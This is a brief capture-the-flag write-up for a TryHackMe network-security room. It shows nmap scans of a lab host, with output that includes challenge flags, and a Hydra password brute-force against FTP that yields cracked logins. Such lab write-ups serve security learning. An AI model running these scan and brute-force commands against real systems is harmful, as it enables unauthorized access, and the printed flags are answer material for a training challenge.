https://tryhackme.com/room/netsecchallenge

# Nmap

```bash
┌──(root㉿kali)-[~]
└─# nmap -p- --min-rate 10000 -Pn -vv 10.10.50.69
```

After making sure there's only 6 ports listening on the target

```bash
# Nmap 7.93 scan initiated Sat Dec 31 08:14:30 2022 as: nmap -sV -sC -Pn -T4 -v -p 80,139,445,22,8080,10021 --version-intensity 9 -oN net_sec 10.10.50.69
Nmap scan report for 10.10.50.69
Host is up (0.28s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
| ssh-hostkey: 
|   3072 da5f69e2111f7c6680896154e87b16f3 (RSA)
|   256 3f8c0946ab1cdfd73583cf6d6e177e1c (ECDSA)
|_  256 eda93aaa4c6b16e60d437546fb33b229 (ED25519)
| fingerprint-strings: 
|   Arucer, DistCCD, NULL, beast2, gkrellm, minecraft-ping, mydoom, vp3: 
|     SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
|   Hello, Help, LPDString, Memcache, NessusTPv10, NessusTPv11, NessusTPv12, SqueezeCenter_CLI, Verifier, VerifierAdvanced, WWWOFFLEctrlstat, dominoconsole, tarantool: 
|     SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
|_    Invalid SSH identification string.
80/tcp    open  http        lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
|_http-title: Hello, world!
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
8080/tcp  open  http        Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
10021/tcp open  ftp         vsftpd 3.0.3
Service Info: OS: Unix

Host script results:
|_clock-skew: 1s
| nbstat: NetBIOS name: NETSEC-CHALLENG, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   NETSEC-CHALLENG<00>  Flags: <unique><active>
|   NETSEC-CHALLENG<03>  Flags: <unique><active>
|   NETSEC-CHALLENG<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-time: 
|   date: 2022-12-31T13:16:19
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 31 08:16:26 2022 -- 1 IP address (1 host up) scanned in 116.62 seconds

```

# Hydra

Users: `eddie`, `quinn`

```bash
hydra -l "eddie" -P /opt/rockyou.txt ftp://10.10.50.69:10021 
```

- Result
```css
[10021][ftp] host: 10.10.50.69   login: eddie   password: jordan
[10021][ftp] host: 10.10.50.69   login: quinn   password: andrea
```